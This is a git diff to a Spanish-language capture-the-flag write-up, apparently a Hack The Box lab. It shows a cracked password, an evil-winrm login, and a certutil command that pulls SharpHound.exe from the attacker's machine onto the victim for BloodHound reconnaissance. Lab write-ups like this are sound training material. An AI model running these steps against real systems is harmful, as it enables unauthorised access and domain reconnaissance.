@@ -93,6 +93,12 @@ adam.scott::iloveyou1
 
 Nos conectamos a la maquina con `evil-winrm -i 10.129.13.42 -u adam.scott -p iloveyou1`
 
+Una vez dentro nos compartimos con un servidor python la herramienta SharpHound.exe que nos ayudara hjacer recoleccion de informacion de la maquina
+
+En la maquina victima nos descargamos el ejecutable con: `certutil.exe -f -urlcache -split http://10.10.14.104:445/SharpHound.exe`
+
+Una vez ejecutado nos descargamos el .zip y se lo pasamaops a BloodHound
+
 
 
 
